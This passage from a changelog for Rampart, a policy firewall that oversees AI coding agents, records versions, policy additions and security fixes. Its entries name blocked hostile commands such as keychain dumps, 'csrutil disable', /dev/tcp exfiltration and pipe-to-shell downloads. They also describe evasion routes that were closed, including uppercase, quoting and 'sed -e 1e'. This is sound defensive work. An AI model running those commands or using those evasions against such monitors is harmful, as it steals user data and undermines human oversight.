- **`rampart setup codex`**: First-class setup subcommand for Codex CLI. Creates `~/.local/bin/codex` wrapper that transparently routes all Codex tool calls through `rampart preload` (LD_PRELOAD syscall interception). Supports `--remove` (verified — only removes Rampart-owned wrappers), `--force`, and PATH detection with a warning if `~/.local/bin` is not on PATH. The interactive setup wizard now auto-wires Codex when detected rather than showing a manual instruction.

### Fixed

- **`rampart upgrade` archive extraction**: goreleaser produces flat archives (`rampart`, `LICENSE`, `README.md`, `CHANGELOG.md` at archive root — no subdirectory prefix). The extraction function incorrectly required exactly one archive member, causing every upgrade attempt to fail with "unexpected archive layout". Removed the single-file guard; binary is found by name regardless of archive member count. Regression test added with the correct flat layout.
- **Deprecated `log` action in `standard.yaml`**: Two policies (`watch-env-access`, `log-mcp-dangerous`) used the legacy `action: log` (now `action: watch`). Updated to `action: watch` to match current schema.

## [0.4.4] — 2026-02-21

### Added

- **`command_contains` condition**: New policy condition for substring matching — matches when the full command string contains any of the listed substrings. Case-insensitive by default (`strings.ToLower` on both sides). Enables patterns that break glob matching: paths with spaces, mixed-case commands, patterns that must appear anywhere in the string. Example: `command_contains: ["do shell script"]` catches AppleScript shell bypasses regardless of quoting.
- **macOS hardening — 17 new policies** in `standard.yaml`:
  - `block-macos-keychain`: `security dump-keychain`, `find-generic/internet-password -w/-ga`, Keychain DB reads, 1Password/Bitwarden/browser cookies
  - `block-macos-security-bypass`: `spctl --master-disable`, `csrutil disable`, `csrutil authenticated-root disable`, `xattr -d com.apple.quarantine`
  - `block-macos-persistence`: `launchctl load/bootstrap`, `defaults write * autoLoginUser *`
  - `block-macos-user-management`: `dscl . -passwd/-create/-delete`
  - `block-macos-osascript-exec`: AppleScript `do shell script` via `command_contains`
  - Additional macOS paths added to `block-credential-access`
- **YAML billion-laughs protection**: `safeUnmarshal()` in `internal/engine/dirstore.go` applies a 1MB cap and `defer/recover` panic recovery to all YAML load paths. `os.Stat` size check before `os.ReadFile` in all loaders. Defense-in-depth — policy files come from trusted disk locations, but bomb inputs are now rejected at the YAML layer.
- **Policy upgrade on `rampart upgrade`**: After a binary upgrade, `upgradeStandardPolicies()` refreshes `standard.yaml`, `paranoid.yaml`, `yolo.yaml`, and `demo.yaml` from embedded profiles. `--no-policy-update` opts out. Custom files (`custom.yaml` and anything not in the built-in map) are never touched. Atomic write (temp + rename) with non-fatal failure.
- **`custom.yaml` template on first setup**: `rampart setup` creates `~/.rampart/policies/custom.yaml` with explanatory comments if it doesn't exist. Documents the naming convention, first-match-wins semantics, and an example rule. Non-fatal on write failure.
- **`block-network-exfil` policy**: Denies `/dev/tcp/` and `/dev/udp/` shell redirection patterns used for covert data exfiltration.
- **`watch-env-access` policy**: Logs `env` and `printenv` invocations for audit trail.
- **Encoding bypass patterns**: `base64 -d | bash`, `base64 --decode | sh`, `printf '\x` and `printf "\x` hex-encode-pipe patterns added to `block-destructive`.
- **SSE bulk-resolve**: Dashboard receives a single `audit_batch` event after bulk-resolve instead of N individual SSE events. Prevents flood that caused browser hangs on large team runs. History tab reloads on `audit_batch`.
- **Standard policy expansion**: Additional patterns across `block-credential-access`, `block-destructive`, and `block-network-exfil` to close coverage gaps on SSH keys, AWS credentials, and shell bypass techniques.

### Fixed

- **`command_contains` engine evaluation**: Condition was parsed but skipped in the real `matchCondition` path; evaluated only in `ExplainCondition`. Now correctly wired into `matchCondition`.
- **Security audit — uppercase bypass**: macOS keychain policies switched from `command_matches` to `command_contains` (case-insensitive). `SECURITY DUMP-KEYCHAIN` and similar all-caps prompts now caught.
- **Security audit — `-ga` flag variants**: `security find-generic-password -ga` and `find-internet-password -ga` added to keychain policy.
- **`demo.yaml` missing from upgrade built-in map**: `rampart upgrade` previously skipped refreshing `demo.yaml`. Fixed.
- **Auth review**: `subtle.ConstantTimeCompare` confirmed in token comparison; SSE endpoint returns 401 without valid token; token logged as prefix only.

## [0.4.3] — 2026-02-20

### Added

- **`rampart upgrade`**: Downloads and installs the latest release from GitHub. Detects architecture, extracts binary, replaces in-place, and reports the new version. `--yes` skips confirmation prompt.
- **`rampart serve --background`**: Starts the serve daemon in the background and exits immediately. PID written to `~/.rampart/rampart-proxy.pid`.
- **`rampart serve stop`**: Sends SIGTERM to the background serve process and waits for it to exit.
- **Silent reload on no-change**: Policy reload triggered by `inotify` now compares the loaded config hash; if policy is identical, the reload is skipped without logging.
- **Task tool → `agent` type**: Claude Code's `Task` tool (which spawns sub-agents) now maps to tool type `"agent"` in `mapClaudeCodeTool()`. Audit events and policy conditions correctly identify sub-agent spawns.

### Changed

- **`sudo` default action**: Changed from `action: watch` (log) to `action: require_approval` in `standard.yaml`. Privileged commands now block and require explicit dashboard approval by default.

### Fixed

- **Windows cross-compilation**: `Setsid` and `EACCES` references moved to platform-specific files. `goreleaser` builds all 6 release targets without errors.
- **Install order in docs**: `go install` promoted as recommended install method; Homebrew tap demoted to alternative.

## [0.4.2] — 2026-02-19

### Fixed

- **`**` glob patterns with >2 segments**: Removed erroneous bail-out in `matchDoubleGlob`. Patterns like `**/.ssh/**/.key/**` now correctly match arbitrary-depth paths. Recursion already handled arbitrary `**` count.
- **`ExplainCondition` / `matchCondition` contradiction**: Empty `when:` now consistently returns `true` (unconditional rule) in both runtime evaluation and explain output. `IsEmpty()` docstring corrected.
- **MCP proxy ignores `ActionWebhook` decisions**: Added `case engine.ActionWebhook:` branch. Webhook is now consulted before forwarding to the child MCP server.
- **`/metrics` endpoint unauthenticated**: Prometheus handler now gated behind `checkAuth`. Unauthenticated requests receive 401.
- **`sink.Write()` return value discarded**: Write errors in the daemon's approval handler are now logged instead of silently dropped.
- **No line-length cap on JSON-RPC reads**: Both client→proxy and proxy→server read paths now use `bufio.NewReaderSize` (4MB) with an explicit size check. A gigabyte-long line from a malicious MCP server previously caused OOM.
- **`rampart doctor` port mismatch**: Doctor now uses the shared `defaultServePort` constant instead of a stale hardcoded `18275`. False negatives on directly-run serve are fixed.
- **`DirStore` silently drops invalid policy files**: `rampart doctor` now runs `LintPolicyFile` on each loaded policy and surfaces rule typos and condition field errors as failures with a hint to run `rampart policy lint`.
- **Unicode-correct glob matching**: Glob comparison now operates on Unicode code points rather than bytes. Non-ASCII characters in command strings or glob patterns match correctly.

## [0.4.1] — 2026-02-19

### Security

- **CEF log injection**: `esc()` and `escH()` in `internal/audit/cef.go` now escape `\n`/`\r` in addition to `\` and `=`/`|`. An agent could previously inject newlines into command or path parameters to forge additional CEF fields in the audit log. JSONL output was unaffected.
- **Service file token exposure**: Launchd plist and systemd unit files written with mode `0o600` (was `0o644`). Both files contain `RAMPART_TOKEN` inline. `os.Chmod` applied after `os.WriteFile` to fix permissions on existing files upgraded in-place.
- **Template injection in service files**: Switched plist generation from `text/template` to `html/template`. Token sanitized (newlines/CR/tabs stripped) before embedding in `serviceConfig`. `plistXMLEscape()` helper added for the `fmt.Sprintf` path in `setup.go`.
- **Parse failures fail closed**: Hook now returns `hookDeny` (not `hookAllow`) on stdin parse failure when `mode=enforce`. A bug or malformed hook payload must not silently allow a tool call. Monitor/audit modes remain fail-open.
- **Ctrl-C → `hookDeny`**: Context cancellation during approval creation now fails closed instead of falling back to Claude Code's native permission prompt.
- **200 denied → `hookDeny`**: Bulk-deny response (HTTP 200 with `status: "denied"`) now correctly maps to deny. Previously incorrectly returned `hookAsk`.

### Fixed

- **Goroutine leak on shutdown**: `Server.Shutdown()` now calls `s.approvals.Close()`, stopping the background cleanup goroutine and unblocking `watchExpiry` goroutines. Previously they leaked for up to 1 hour (the default approval timeout) after every graceful shutdown.
- **Data races**: `Get()` and `List()` return snapshot copies (value, not pointer) eliminating races with concurrent `watchExpiry` writes. Race detector clean.
- **Empty approval ID guard**: Hook now returns `hookAsk` immediately if serve returns 201 with an empty ID, instead of polling `/v1/approvals/` for the full timeout.
- **Poll loop HTTP status codes**: 404/410 → immediate `hookDeny`; 5xx → log and retry. Previously all non-network errors spun silently until timeout.
- **`bulk-resolve` action validation**: Empty or unrecognized action values previously defaulted to approve, silently bulk-approving entire runs on typos or empty request bodies. Now returns 400.
- **`AutoApproveRun` TOCTOU**: Auto-approve cache is now set before the resolve loop. Approvals created between `List()` and end of loop are caught by the cache rather than remaining pending.

## [0.4.0] — 2026-02-19

### Added

- **Agent team run grouping**: Every tool call is now tagged with a `run_id` derived from Claude Code's `session_id` (shared across all agents in the same session). Cline users get `taskId` as the run ID. Override with `RAMPART_RUN` env var; `CLAUDE_CONVERSATION_ID` used as fallback. Zero configuration required — existing policies and users see no change.
- **`POST /v1/approvals/bulk-resolve`**: Resolve all pending approvals for an agent team run in one API call. Body: `{"run_id": "...", "action": "approve|deny", "resolved_by": "..."}`. Returns `{"resolved": N, "ids": [...]}`. Empty or missing `run_id` is hard-rejected with 400 to prevent accidental mass-approval.
- **Auto-approve cache**: After bulk-approving a run, subsequent tool calls from that run bypass the approval queue automatically for the duration of the approval timeout (default 1h). Cache is TTL-based and cleaned up in the regular `Cleanup()` cycle — no goroutine leaks.
- **Dashboard run clusters**: When 2+ pending approvals share a `run_id`, the Active tab groups them into a collapsible cluster card showing `Run: {id[:8]}… (N pending)`. Clusters have **Approve All** and **Deny All** buttons with confirmation dialogs. Solo items (no `run_id`, or unique `run_id`) render exactly as before.
- **`GET /v1/approvals` run_groups field**: The approvals list response now includes a `run_groups` array alongside the flat `approvals` array. Each entry has `run_id`, `count`, `earliest_created_at`, and `items`. Only groups with 2+ pending items are included; groups are sorted by `MIN(created_at)` (chronological, not UUID order). Fully backwards compatible — existing consumers ignore the new field.
- **Full PreToolUse hook schema**: `hookInput` now captures all fields Claude Code sends: `session_id`, `transcript_path`, `cwd`, `permission_mode`, `hook_event_name`, `tool_use_id`. Previously only `tool_name` and `tool_input` were parsed.
- **`run_id` in audit events**: Audit log entries include `"run_id"` (omitempty) so team runs are traceable across the full audit trail.

### Fixed

- **CI docs deploy**: The Deploy Docs workflow was pushing compiled output to `peg/rampart`'s own `gh-pages` branch instead of `peg/rampart-docs`, which is the repo actually serving `docs.rampart.sh`. Fixed to clone and push to `peg/rampart-docs`. Requires `DOCS_DEPLOY_TOKEN` secret (PAT with `contents:write` on `peg/rampart-docs`).

## [0.3.1] — 2026-02-18

### Fixed

- **Mobile hero font size**: `.hero-title` heading was 2.5rem on narrow screens (≤600px), causing word-wrap on small phones. Reduced to 1.75rem via media query.
- **`file_path` parameter support**: Claude Code sends `file_path` (not `path`) in `Read`, `Write`, and `Edit` tool input. `Path()` method and dashboard `extractCmd` function now check `file_path` first, then fall back to `path`. Previously the file path was silently dropped from audit events and approval cards for all file operations.

### Changed

- **Docs subtitle**: Updated from "Open-source firewall for AI agents" to "Open-source guardrails for AI agents. A policy firewall for shell commands, file access, and MCP tools."

## [0.3.0] — 2026-02-18

### Added

- **`rampart quickstart`**: One-shot setup command — detects your AI coding environment (Claude Code, Codex, etc.), installs the service, wires up hooks, and runs `rampart doctor`. Get protected in a single command.
- **`rampart init --project`**: Scaffolds `.rampart/policy.yaml` in the current git repo with a commented template for team-shared project rules. Errors clearly if the file already exists (no silent overwrites). Commit the generated file to share guardrails with your team.
- **Project-local policy files**: Drop `.rampart/policy.yaml` in any git repo and Rampart automatically loads and layers those rules on top of your global policy — no configuration required. Rules are additive. Set `RAMPART_NO_PROJECT_POLICY=1` to disable. (`LayeredStore`)
- **Session identity**: Every hook audit event now carries a `session` field auto-derived from `git rev-parse` (format: `repo/branch`, e.g. `rampart/staging`). Zero configuration — falls back to `""` outside git repos. Override with the `RAMPART_SESSION` env var for orchestrators and CI.
- **Policy session conditions**: New `session_matches` / `session_not_matches` condition fields in `when:` blocks. Use `session:` at the `match:` level to scope an entire policy to specific sessions (glob patterns, same semantics as `agent:`).
- **Policy REPL**: The dashboard Policy tab now has a "Try a Command" tester — type any `exec`, `write`, or `read` command and instantly see what your loaded policy would do (allow / deny / require_approval / watch), including which rule matched. Backed by the new `POST /v1/test` endpoint.
- **Dashboard: session in approval cards**: Active approval cards show the session (repo/branch) the request came from. The Active tab groups pending approvals by session for easier triage.
- **Dashboard: write/read path display**: The denials feed and approval cards now correctly display the file path for `write` and `read` tool calls (previously only `exec` commands were shown).
- **Dashboard History: Session column**: Session field added between Agent and Tool in the History tab; included in search; detail panel shows Session field.
- **`rampart doctor` overhaul**:
  - Colored terminal output: `✓` green, `✗` red, `⚠` yellow. Colors suppressed when `--json` is set or `NO_COLOR` is present.
  - `--json` flag: Structured output `{checks, issues, warnings}` for CI integration.
  - Project policy check: Shows whether a `.rampart/policy.yaml` is active in the current repo (informational, never a failure).
  - 6 new health checks: PATH (rampart binary in PATH), Token (persisted or env), Hook binary path (verifies absolute paths in `settings.json` exist), Token auth (validates token against `/v1/policy`), Policies via API (checks `policy_count > 0`), Pending approvals (warns if any pending).
  - Fixed port from 19090/9090 to the canonical **18275**.
  - Exits 1 when issues > 0 (previously always exited 0).
- **`rampart test --json`**: `--json` flag on `rampart test` (and bare `rampart <file>`) emits `{passed, failed, errors, total, tests:[...]}` to stdout for CI integration.
- **`rampart test` zero-arg**: When called with no arguments, auto-discovers `rampart-tests.yaml` then `rampart.yaml` in the current directory.
- **`rampart policy test`**: Alias for `rampart test` available under the `policy` subcommand.
- **`/healthz` version field**: The health endpoint now includes `"version"` in the JSON response.
- **Audit API session filter**: `GET /v1/audit/events?session=<value>` filters events by session. `GET /v1/audit/stats` now includes a `by_session` breakdown.

### Changed

- **Default approval timeout**: Increased from **5 minutes to 1 hour**. Override with `--approval-timeout` (e.g. `--approval-timeout=30m`).

### Fixed

- **`sudo **` glob**: `sudo *` in standard.yaml did not match commands containing path arguments (e.g. `sudo rm -rf /`) because `*` does not cross `/` in glob matching. Changed to `sudo **` throughout.
- **`**` glob patterns in standard.yaml**: Pipe-to-shell patterns (`curl * | bash`, `wget * | sh`, etc.) and other path-based rules now use `**` consistently so URLs and file paths with `/` are correctly matched.
- **Policy REPL JSON parse**: The dashboard REPL was calling `api(...)` and treating the result as parsed JSON. `api()` returns a `Response` object — fixed to `await api(...).then(r => r.json())`.
- **`extractCmd` write/read path**: Dashboard denials feed was only extracting the command field from `exec` tool calls. Fixed to also extract the `path` field from `write` and `read` tool calls.
- **`doctorPending` key**: Doctor's pending approval check was reading the wrong key from the `/v1/approvals` response, always showing 0 pending regardless of actual state.
- **`responseRegexCache` deep copy**: Response-side regex cache was aliased across evaluations, causing cross-request cache pollution. Now deep-copied per evaluation.
- **`RAMPART_SESSION` env priority**: Environment variable now correctly takes priority over the git-derived session value when both are present.
- **Duplicate policy log in `mergeYAMLFiles`**: Downgraded from WARN to DEBUG. Same-directory YAML files with overlapping policy names no longer spam the log.

## [0.2.36] — 2026-02-18

### Fixed
- Default policy pipe-to-shell patterns (`curl * | bash`, `wget * | sh`, etc.) now use `**` instead of `*` so they correctly match URLs containing `/`. Previously `curl https://example.com/payload | bash` was silently allowed because `*` does not cross `/` boundaries in glob matching.

## [0.2.35] — 2026-02-18

### Fixed
- `rampart hook` now auto-reads the token from `~/.rampart/token` when `RAMPART_TOKEN` is not set in the environment. Claude Code hooks don't inherit the user's shell environment, so the token was never available at hook runtime — events silently fell back to local-only evaluation and never reached the dashboard. The hook now discovers both the serve URL (`localhost:18275`) and the token from standard locations, with no credentials needed in `settings.json`.
- `rampart serve install` now persists the generated token to `~/.rampart/token` (mode 0600). This is the canonical token location the hook reads from automatically.
- Dashboard now shows hook events. The hook and serve both write to `~/.rampart/audit/` but used different filename prefixes (`audit-hook-YYYY-MM-DD.jsonl` vs `YYYY-MM-DD.jsonl`). The audit API now reads both, so all events appear in the History tab regardless of which component wrote them.

## [0.2.34] — 2026-02-18

### Fixed
- `rampart setup claude-code` now writes the absolute binary path in the hook command (e.g. `/usr/local/bin/rampart hook`) instead of bare `rampart hook`. Claude Code hooks do not inherit the user's shell `PATH`, so the bare name silently failed at runtime.
- Hook removal (`rampart setup claude-code --remove`) now correctly identifies absolute-path hook entries written by the above fix.
- `rampart serve --addr` now validates the value is a valid IP address and returns a clear error on bad input.
- Success output for `rampart setup claude-code` now shows the resolved hook command path so users can verify the correct binary is registered.

### Tests
- Added `TestMemoryStore_Load` and `TestMixedStore_Load` covering embedded policy loading, directory merging, duplicate skipping, and error propagation.

## [0.2.33] — 2026-02-18

### Added
- `rampart serve --addr` flag to bind to a specific interface (e.g. `127.0.0.1` to avoid conflicts with Tailscale/VPN listeners)
- Default embedded policy: `rampart serve` now works out of the box with no `--config` file required
- `/v1/policy` API endpoint for runtime policy introspection (mode, counts, config path)
- Dashboard: 3-tab layout (Active / History / Policy), flex card layout for pending approvals, action:watch badge style

### Changed
- **`action: watch`** replaces `action: log` as the canonical name for the observe-but-allow action. `log` still works but emits a lint deprecation warning. All CLI output, TUI, and webhook formatters updated to use `watch`.
- **Default policy change:** `sudo *` commands now trigger `require_approval` instead of `log`. If you rely on sudo passing through silently, set `action: watch` or `action: allow` explicitly.
- `log-network-exfil` policy removed from standard.yaml — plain `curl`/`wget` are now allowed by default. Only piped execution (`curl ... | bash`) is blocked.
- `rampart serve install` (macOS launchd): added `WorkingDirectory` to plist to prevent CWD issues

### Fixed
- `action: watch` now correctly parsed in all contexts (`ParseAction`, `parseDefaultAction`, policy lint)
- Action rename fully propagated to all consumers (audit CLI stats, status, watch TUI, wrap, Slack/Discord/Teams webhooks)
- Shell profile echo commands shown after `serve install` on macOS and Linux

## [0.2.3] — 2026-02-18

### Added
- **Unified approval system** — `rampart hook` now delegates `require_approval` to a running `rampart serve` instance via `--serve-url`. Approvals can be resolved from the dashboard, `rampart watch`, API, or native Claude Code prompt (fallback).
- **Dashboard v2** — Complete redesign with compact table layout, 4 tabs (Pending, History, Audit Log, Rules), dark/light theme toggle, bulk approve/deny, resizable columns, dangerous command detection.
- **Persist-to-policy** — "Always Allow" creates auto-generated rules in `~/.rampart/policies/auto-allowed.yaml` with clean YAML output and deduplication.
- **Rules management** — View and revoke auto-allowed rules from the dashboard or API (`GET/DELETE /v1/rules/auto-allowed`).
- **Audit API** — `GET /v1/audit/events` (query with filters), `/dates`, `/stats`, `/export` (JSONL download).
- **Directory-based policy loading** — Engine loads all `*.yaml` from a policies directory with `--config-dir`. Auto-includes `~/.rampart/policies/`.
- **Hot reload** — Policies re-read every 30 seconds (configurable via `--reload-interval`), so auto-allowed rules take effect without restart.
- **Configurable approval timeout** — `--approval-timeout` flag on `rampart serve` (default: 5 minutes).
- **Interactive `rampart watch`** — Keybindings: `a` approve, `d` deny, `A` always-allow, `1-9` select, `q` quit.
- **Approval deduplication** — Same tool+command+agent within 60 seconds returns existing approval ID.
- **Hash-chained audit events** for all approval resolutions (approved/denied/always-allowed).
- **Explicit `permissionDecision: "allow"`** for PreToolUse hooks (contributed by @aegixx, PR #51).

### Changed
- **⚠️ Breaking: Empty `when:` clause now matches all tool calls.** Previously, rules with no `when:` conditions silently matched nothing. Now they act as catch-all rules within their policy scope. **If you have rules with empty `when:` clauses, they will now activate.** Review your policies before upgrading.
- Dashboard redesigned from card layout to compact table rows.
- `--serve-token` flag deprecated — prefer `RAMPART_TOKEN` environment variable (flag visible in `ps aux`).
- Lint message for empty `when:` downgraded from warning to info (correct behavior now).

### Fixed
- Approval ordering now deterministic (sorted by creation time).
- Dangerous commands (`rm`, `kill`, `chmod`, `dd`, etc.) never generalized in persist-to-policy.
- Single-token commands kept exact in generalization (`ls` stays `ls`, not `ls *`).
- Atomic policy file writes prevent corruption on concurrent "Always Allow".
- Hook polling respects context cancellation for clean Ctrl-C.
- Dashboard timer updates no longer cause layout shift.
- Double `Stop()` on engine no longer panics.
- Audit dates endpoint no longer leaks server filesystem path.

### Security
- All new API endpoints require Bearer token authentication.
- "Always Allow" button requires confirmation dialog.
- Auto-generated YAML uses `yaml.Marshal` (prevents YAML injection).
- HMAC-signed approval resolve URLs for webhook notifications.

## [0.2.26] — 2026-02-16

### Added
- **Shell subcommand extraction** — `ExtractSubcommands()` detects commands inside `$(...)`, backticks, and `eval` wrappers. Matcher evaluates extracted subcommands against `command_matches` patterns, closing a documented evasion vector. 16 tests + fuzz test
- **Tutorial docs** — "Protect your first agent in 5 minutes" walkthrough and troubleshooting guide with 6 common issues
- **Example policy templates** — `policies/examples/` with web-developer, infrastructure, data-science, and lockdown templates (all with inline tests)
- **CLI test coverage** — 49.3% → 58.3% (3 new test files)

## [0.2.25] — 2026-02-16

### Added
- **Response-side scanning** — PostToolUse hooks evaluate tool output through `EvaluateResponse()`. Default credential leak patterns in `standard.yaml` (AWS keys, GitHub PATs, private keys, OpenAI keys, Slack tokens)
- **Policy linter** — `rampart policy lint` catches common YAML mistakes: unknown fields with typo suggestions, match/when confusion, reason/message confusion, shadowed rules, excessive glob depth. 10 checks (3 error, 5 warning, 2 info)
- **CLI test coverage** — 15 new test files, coverage 37.7% → 49.7%

### Fixed
- **PostToolUse field name** — corrected `tool_result` → `tool_response` per Claude Code docs
- **PostToolUse output format** — uses top-level `decision`/`reason` instead of `hookSpecificOutput`

## [0.2.24] — 2026-02-15

### Added
- **Shell-aware command parsing** — `NormalizeCommand()` strips quotes, backslash escapes, env var prefixes to prevent policy evasion (`'rm' -rf /`, `r\m`, `"rm" -rf /` all now match)
- **`SplitCompoundCommand()`** — handles `&&`, `||`, `;`, pipes — each segment matched independently
- **Policy test framework** — `rampart test policy.yaml` runs inline test suites with colored output, `--verbose` and `--run` filtering
- **Prometheus metrics** — opt-in via `rampart serve --metrics`. 5 metrics: `rampart_decisions_total`, `rampart_eval_duration_seconds`, `rampart_pending_approvals`, `rampart_policy_count`, `rampart_uptime_seconds`
- **Goreleaser Homebrew** — `brews:` section for auto-updating `peg/homebrew-rampart` on release
- **30-second quickstart** — copy-paste install + setup + inline output preview at top of README
- **Collapsible TOC** — README table of contents grouped by category

## [0.2.23] — 2026-02-15

### Security
- **Removed `git` and `sed` from safe binaries** — prevents policy bypass via `git -c core.sshCommand` and `sed -e '1e'`
- **Webhook `FailOpen` default → false** — webhook outages now block instead of silently allowing
- **Go 1.24.13** — resolves 13 reachable stdlib vulnerabilities
- **Audit file permissions 0644 → 0600** — prevents other users from reading audit logs
- **HTTP webhook URL warning** — logs `slog.Warn` for non-HTTPS webhook URLs
- **Daemon API auth fix** — Bearer token now works when HMAC signer is also configured
- **Token removed from dashboard URL** — `rampart serve` prints hint instead of full token
- **Referrer-Policy → no-referrer** — prevents token leakage via referrer headers
- **Approval store capped at 1000** — prevents memory exhaustion from unbounded approvals
- **Reload rejects zero-policy configs** — prevents accidental "allow everything" on bad reload
- **Glob `**` segment limit (max 3)** — prevents quadratic matching complexity
- **`stripLeadingComments` returns empty for all-comment input** — prevents bypass via comment-only payloads

### Added
- **govulncheck in CI** — informational vulnerability scanning on every push
- **SHA-pinned GitHub Actions** — all 3 workflow files use commit hashes
- **CODEOWNERS** — `* @peg`
- **Glob matching limitations documented** — in policy engine and threat model docs

## [0.2.22] — 2026-02-15

### Changed
- **README architecture diagram redesigned** — LR flow, agents grouped, audit as required step
- **`tamper-evident` language** — corrected from `tamper-proof` throughout docs and code
- **Setup command table** — added to README with `--patch-tools` note for OpenClaw

## [0.2.21] — 2026-02-15

### Added
- **GET approval endpoint** — `GET /v1/approvals/:id` for polling approval status
- **OpenClaw shim** — auto-detection and chat-based approval integration

## [0.2.2] — 2026-02-15

### Added
- **Dashboard on `rampart serve`** — embedded approval dashboard now at `/dashboard/` (was daemon-only)
- **Community policy library** — 5 ready-to-use templates: Kubernetes, AWS CLI, Terraform, Docker, Node.js/Python
- **Fuzz tests** — 6 fuzz test suites covering policy parser, condition matcher, engine evaluator, hook parsers, proxy request parser, and command sanitizer
- **Approval dashboard documentation** — full guide with security model, API reference, and hook integration
- **Upgrade and uninstall guides** — covers all install methods, hook removal, and data cleanup

## [0.2.0] - 2026-02-15

### Added
- **`require_approval` action** — block tool calls until a human approves or denies them
- **Claude Code `ask` hook** — `require_approval` maps to Claude Code's native permission prompt (`permissionDecision: "ask"`)
- **MCP proxy blocking** — `require_approval` tools stay visible in `tools/list` but block on `tools/call` until resolved
- **Signed resolve URLs** — HMAC-SHA256 self-authenticating links for webhook recipients (no token needed)
- **Auto-generated signing key** — `~/.rampart/signing.key` created on first run (0600 permissions)
- **`--signing-key` flag** — custom signing key path for `serve` and `daemon` commands
- **`--resolve-base-url` flag** — configurable base URL for approval resolve links
- **Web dashboard security** — X-Frame-Options DENY, Content-Security-Policy, nosniff, no-store headers
- **Dashboard history section** — view resolved approvals with resolution details
- **OpenClaw notifier** — dedicated webhook format for OpenClaw approval integration
- **OpenClaw approval guide** — `docs/guides/openclaw-approval.md`
- **GoReleaser config** — reproducible cross-platform release builds with checksums
- **GitHub Actions release workflow** — automatic releases on tag push
- **CHANGELOG.md** — this file

### Changed
- **BREAKING: Webhook JSON tags are now snake_case** — `"Action"` → `"action"`, `"Tool"` → `"tool"`, etc. Update any webhook consumers that parse field names.
- **Default `notify.on` includes `require_approval`** — approval notifications fire by default without explicit config
- **Go version bumped to 1.24.13** — fixes 13 known vulnerabilities in standard library (crypto/tls, net/url, net/http, crypto/x509, encoding/asn1, encoding/pem, os/exec)
- **Makefile LDFLAGS fixed** — version info now correctly injected into binaries (was using wrong module path)
- **Regex patterns pre-compiled** — `sanitizeCommand()` no longer recompiles 15 regexes per call

### Fixed
- **MCP proxy zombie approvals** — pending approvals now cleaned up on context cancellation and proxy shutdown
- **MCP proxy silent drops** — JSON-RPC error now sent to client on cancel/shutdown (was silent)
- **Dashboard CSP headers** — keywords properly quoted (`'self'`, `'unsafe-inline'`)
- **Dashboard XSS** — approval IDs escaped in `data-id` attributes
- **Dashboard polling** — exponential backoff (2s → 30s) with AbortController to prevent request overlap
- **OpenClaw platform auto-detection** — tightened from substring match to domain-only (openclaw.dev/ai/io)
- **Resolve URL generation** — eliminated mutex-based addr lookup race; uses captured listener address

## [0.1.14] - 2026-02-11

### Added
- Daily audit file rotation (`YYYY-MM-DD.jsonl`)
- Size rotation within day (`.p1.jsonl`, `.p2.jsonl`)

## [0.1.13] - 2026-02-11

### Added
- Heredoc body stripping (`StripHeredocBodies`) to prevent false positives
- Quoted argument stripping for safe binaries (echo, git, cat)
- `command_effective` field in ToolCall params

### Fixed
- Policy gaps: `/etc/shadow`, `/etc/passwd`, `/etc/sudoers` in standard policy
- Doctor only shows hook checks for installed agents
- Shim template uses `/v1/tool/exec` (was `/v1/preflight/exec`)

## [0.1.12] - 2026-02-10

### Added
- `--patch-tools` flag for native OpenClaw file tool patching
- Interactive setup wizard improvements
- `--remove` flag restores tool backups

## [0.1.11] - 2026-02-10

### Added
- Interactive setup wizard (`rampart setup`)
- `rampart doctor` with version check
- `rampart status`, `rampart test`, `rampart log` commands
- `--remove` flag for all agent integrations
- Colored deny messages in terminal
- Enhanced `rampart watch` TUI

## [0.1.8] - 2026-02-09

### Added
- Leading comment stripping for agent frameworks
- Security hardening: path traversal bypass fix, 1MB response body cap, HTTP timeouts
- MCP proxy test coverage (30 tests, was 0%)

### Fixed
- Hot-reload race: fsnotify truncated-file rejection with 100ms delay
- Glob matching: `*` now crosses `/` for leading wildcard patterns

## [0.1.7] - 2026-02-09

### Added
- `--syslog` flag (RFC 5424 syslog output)
- `--cef` flag (Common Event Format for SIEM integration)
- Wazuh integration guide with custom decoder and rules
- `action: webhook` for delegating decisions to external HTTP endpoints

## [0.1.6] - 2026-02-08

### Added
- `rampart mcp scan` — auto-generate policy YAML from MCP server tool lists

## [0.1.5] - 2026-02-08

### Added
- **LD_PRELOAD interception** — `preload/librampart.c` (472 lines C)
- `rampart preload -- codex` for Codex CLI support
- Intercepts execve/execvp/system/popen/posix_spawn

## [0.1.3] - 2026-02-07

### Fixed
- Hot-reload bug: empty config during mid-write → deny-all. Fix: 100ms delay + reject empty configs
- Glob matching: `filepath.Match` `*` doesn't cross `/`. Added `matchWildcardSegments`

## [0.1.2] - 2026-02-07

### Added
- Initial public release
- Policy engine with glob matching
- Claude Code hooks integration
- MCP proxy with tools/list filtering
- HTTP proxy with Bearer auth
- Shell shim (`rampart wrap`)
- Webhook notifications (Slack, Discord, Teams, generic)
- Audit logging (JSONL)
- `rampart watch` TUI
- Standard policy (`policies/standard.yaml`)

[Unreleased]: https://github.com/peg/rampart/compare/v0.9.3...HEAD
[0.9.3]: https://github.com/peg/rampart/compare/v0.9.2...v0.9.3
[0.9.2]: https://github.com/peg/rampart/compare/v0.9.1...v0.9.2
[0.5.0]: https://github.com/peg/rampart/compare/v0.4.12...v0.5.0
[0.4.12]: https://github.com/peg/rampart/compare/v0.4.11...v0.4.12
[0.4.11]: https://github.com/peg/rampart/compare/v0.4.10...v0.4.11
[0.4.10]: https://github.com/peg/rampart/compare/v0.4.9...v0.4.10
[0.4.9]: https://github.com/peg/rampart/compare/v0.4.8...v0.4.9
[0.4.8]: https://github.com/peg/rampart/compare/v0.4.7...v0.4.8
[0.4.7]: https://github.com/peg/rampart/compare/v0.4.6...v0.4.7
[0.4.6]: https://github.com/peg/rampart/compare/v0.4.5...v0.4.6
[0.4.5]: https://github.com/peg/rampart/compare/v0.4.4...v0.4.5
[0.4.4]: https://github.com/peg/rampart/compare/v0.4.3...v0.4.4
[0.4.3]: https://github.com/peg/rampart/compare/v0.4.2...v0.4.3
[0.4.2]: https://github.com/peg/rampart/compare/v0.4.1...v0.4.2
[0.4.1]: https://github.com/peg/rampart/compare/v0.4.0...v0.4.1
[0.4.0]: https://github.com/peg/rampart/compare/v0.3.0...v0.4.0
[0.3.0]: https://github.com/peg/rampart/compare/v0.2.36...v0.3.0
[0.2.36]: https://github.com/peg/rampart/compare/v0.2.35...v0.2.36
[0.2.35]: https://github.com/peg/rampart/compare/v0.2.34...v0.2.35
[0.2.34]: https://github.com/peg/rampart/compare/v0.2.33...v0.2.34
